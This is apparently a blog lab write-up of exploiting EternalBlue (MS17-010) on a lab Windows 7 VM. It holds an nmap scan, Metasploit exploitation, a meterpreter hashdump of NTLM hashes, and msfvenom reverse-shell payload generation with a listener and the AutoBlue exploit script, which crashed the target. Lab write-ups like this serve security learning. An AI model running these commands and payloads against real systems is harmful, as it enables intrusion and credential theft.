@@ -1,0 +1,372 @@
+---
+title: "Eternal Blue"
+date: "2025-11-13"
+draft: false
+tags: ["Machine", "Windows", "Easy"]
+summary: "The target machine was identified as **Windows 7 SP1** with SMB services exposed on port **445**, making it vulnerable to **EternalBlue (MS17-010)**. Using Metasploit, the vulnerability was successfully exploited, resulting in a Meterpreter session and full system access. Password hashes were then extracted from the target. A manual exploitation attempt using AutoBlue-MS17-010 triggered the vulnerability but caused a BSOD crash. This demonstrated how EternalBlue can lead to remote code execution and complete system compromise on unpatched systems."
+images: ["/static/images/blueview.png"]
+---
+
+# Eternal Blue
+
+---
+
+# Lab Setup
+
+## Kali Linux
+
+![Blue](/static/images/Blue/image.png)
+
+## Windows
+
+![Blue](/static/images/Blue/image%201.png)
+
+---
+
+# Pinging
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ping 10.0.2.5
+PING 10.0.2.5 (10.0.2.5) 56(84) bytes of data.
+64 bytes from 10.0.2.5: icmp_seq=1 ttl=128 time=14.2 ms
+64 bytes from 10.0.2.5: icmp_seq=2 ttl=128 time=1.95 ms
+^C
+--- 10.0.2.5 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 1.950/8.082/14.215/6.132 ms
+```
+
+# Nmap Scan:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sCV 10.0.2.5    
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 09:20 EST
+Nmap scan report for 10.0.2.5
+Host is up (0.0040s latency).
+Not shown: 990 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+| ssl-cert: Subject: commonName=WIN-845Q99OO4PP
+| Not valid before: 2025-10-15T06:18:26
+|_Not valid after:  2026-04-16T06:18:26
+| rdp-ntlm-info: 
+|   Target_Name: WIN-845Q99OO4PP
+|   NetBIOS_Domain_Name: WIN-845Q99OO4PP
+|   NetBIOS_Computer_Name: WIN-845Q99OO4PP
+|   DNS_Domain_Name: WIN-845Q99OO4PP
+|   DNS_Computer_Name: WIN-845Q99OO4PP
+|   Product_Version: 6.1.7601
+|_  System_Time: 2025-11-12T14:21:30+00:00
+|_ssl-date: 2025-11-12T14:21:45+00:00; +4s from scanner time.
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 08:00:27:2A:95:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-11-12T14:21:30
+|_  start_date: 2025-11-12T14:10:08
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 1h00m03s, deviation: 2h14m09s, median: 3s
+|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2a:95:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+| smb-os-discovery: 
+|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: WIN-845Q99OO4PP
+|   NetBIOS computer name: WIN-845Q99OO4PP\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-11-12T09:21:30-05:00
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 75.29 seconds
+```
+
+The target 10.0.2.5 is up and identified as **Windows 7 Ultimate (6.1.7601 SP1)**. Open, relevant services: SMB/RPC accessible on **135, 139, 445** (microsoft-ds/NetBIOS/RPC) and **RDP (3389)**; the RDP service presents an SSL certificate for `WIN-845Q99OO4PP` valid 2025-10-15 → 2026-04-16 and reports `Product_Version: 6.1.7601`. SMB scripts show the scanner accessed SMB as **guest**, authentication level `user`, challenge/response supported, and **message signing is disabled / not required**, which weakens integrity protections. Service detection and SMB OS discovery consistently return the Windows 7 SP1 fingerprint and workgroup `WORKGROUP`.
+
+# Exploitation using Metasploit
+
+## Searched for **`eternalblue`**
+
+```bash
+msf6 > search eternalblue
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
+After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
+```
+
+I am going to use **`“windows/smb/ms17_010_eternalblue”`** 
+
+## Set options
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.0.2.5
+rhosts => 10.0.2.5    
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost eth0
+lhost => 10.0.2.4
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+```
+
+## Exploit
+
+![Blue](/static/images/Blue/image%202.png)
+
+It worked and I got the **`meterpreter shell`**  
+
+### Hashdump
+
+```bash
+meterpreter > hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
+user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+meterpreter > 
+```
+
+- Those lines from `hashdump` are **password hashes** extracted from the Windows.
+    
+    Format: `username:RID:LM_HASH:NTLM_HASH:::`.
+    
+- The `NTLM_HASH` values are what an attacker would target to recover plaintext passwords via offline cracking. Whether cracking succeeds depends on password strength and attacker resources.
+- Possession of these hashes is **evidence of credential exposure** and a serious security breach.
+
+---
+
+# Manual Exploitation
+
+I searched for public exploits avaliable for the eternal blue and found this github repo with detailed walkthrough
+
+[https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
+
+## Clone the repo
+
+```bash
+┌──(kali㉿kali)-[~/blue]
+└─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010                                              
+Cloning into 'AutoBlue-MS17-010'...
+remote: Enumerating objects: 145, done.
+remote: Counting objects: 100% (69/69), done.
+remote: Compressing objects: 100% (30/30), done.
+remote: Total 145 (delta 52), reused 43 (delta 39), pack-reused 76 (from 1)
+Receiving objects: 100% (145/145), 105.75 KiB | 327.00 KiB/s, done.
+Resolving deltas: 100% (86/86), done.
+```
+
+### Install the requirements
+
+```bash
+┌──(work)─(kali㉿kali)-[~/blue/AutoBlue-MS17-010]
+└─$ pip install -r requirements.txt
+```
+
+### Usage
+
+**`./shell_prep.sh`** 
+
+```bash
+┌──(work)─(kali㉿kali)-[~/blue/AutoBlue-MS17-010]
+└─$ cd shellcode 
+                                                                                                                                                                             
+┌──(work)─(kali㉿kali)-[~/blue/AutoBlue-MS17-010/shellcode]
+└─$ ./shell_prep.sh   
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+y
+LHOST for reverse connection:
+10.0.2.4
+LPORT you want x64 to listen on:
+4444
+LPORT you want x86 to listen on:
+2222
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+0
+Generating x64 cmd shell (staged)...
+
+msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.0.2.4 LPORT=4444
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 511 bytes
+Saved as: sc_x64_msf.bin
+
+Generating x86 cmd shell (staged)...
+
+msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.0.2.4 LPORT=2222
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 375 bytes
+Saved as: sc_x86_msf.bin
+
+MERGING SHELLCODE WOOOO!!!
+DONE
+```
+
+**`./listener_prep.sh`**
+
+```bash
+┌──(work)─(kali㉿kali)-[~/blue/AutoBlue-MS17-010/shellcode]
+└─$ cd ..       
+                                                                                                                                                                             
+┌──(work)─(kali㉿kali)-[~/blue/AutoBlue-MS17-010]
+└─$ ./listener_prep.sh
+  __
+  /,-
+  ||)
+  \\_, )
+   `--'
+Eternal Blue Metasploit Listener
+
+LHOST for reverse connection:
+10.0.2.4
+LPORT for x64 reverse connection:
+4444
+LPORT for x86 reverse connection:
+2222
+Enter 0 for meterpreter shell or 1 for regular cmd shell:
+1
+Type 0 if this is a staged payload or 1 if it is for a stageless payload: 0
+Starting listener (staged)...
+Starting postgresql (via systemctl): postgresql.service.
+Metasploit tip: Save the current environment with the save command, 
+future console restarts will use this environment again
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+       =[ metasploit v6.4.64-dev                          ]
++ -- --=[ 2519 exploits - 1296 auxiliary - 431 post       ]
++ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+[*] Processing config.rc for ERB directives.
+resource (config.rc)> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+resource (config.rc)> set PAYLOAD windows/x64/shell/reverse_tcp
+PAYLOAD => windows/x64/shell/reverse_tcp
+resource (config.rc)> set LHOST 10.0.2.4
+LHOST => 10.0.2.4
+resource (config.rc)> set LPORT 4444
+LPORT => 4444
+resource (config.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (config.rc)> set EXITFUNC thread
+EXITFUNC => thread
+resource (config.rc)> exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+resource (config.rc)> set PAYLOAD windows/shell/reverse_tcp
+PAYLOAD => windows/shell/reverse_tcp
+resource (config.rc)> set LPORT 2222
+[*] Started reverse TCP handler on 10.0.2.4:4444 
+LPORT => 2222
+resource (config.rc)> exploit -j
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.0.2.4:2222 
+msf6 exploit(multi/handler) > 
+```
+
+### Exploit
+
+```bash
+┌──(kali㉿kali)-[~/blue/AutoBlue-MS17-010]
+└─$ python eternalblue_exploit7.py 10.0.2.5 shellcode/sc_all.bin 
+shellcode size: 2307
+numGroomConn: 13
+Target OS: Windows 7 Ultimate 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+```
+
+The exploit crashed the target machine, resulting in the Blue screen:
+
+![Blue](/static/images/Blue/image%203.png)
